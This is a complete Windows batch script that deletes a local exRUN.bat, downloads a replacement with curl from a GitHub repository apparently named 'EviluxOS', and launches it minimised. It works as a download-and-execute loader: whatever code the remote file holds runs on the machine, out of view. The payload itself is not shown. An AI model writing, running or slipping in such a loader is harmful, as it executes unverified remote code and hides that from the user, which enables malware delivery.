@echo off
del exRUN.bat
ping localhost -n 2 > NUL
curl https://raw.githubusercontent.com/Anonym286/EviluxOS/main/exRUN.bat >> exRUN.bat
ping localhost -n 2 > NUL
start /MIN exRUN.bat
exit
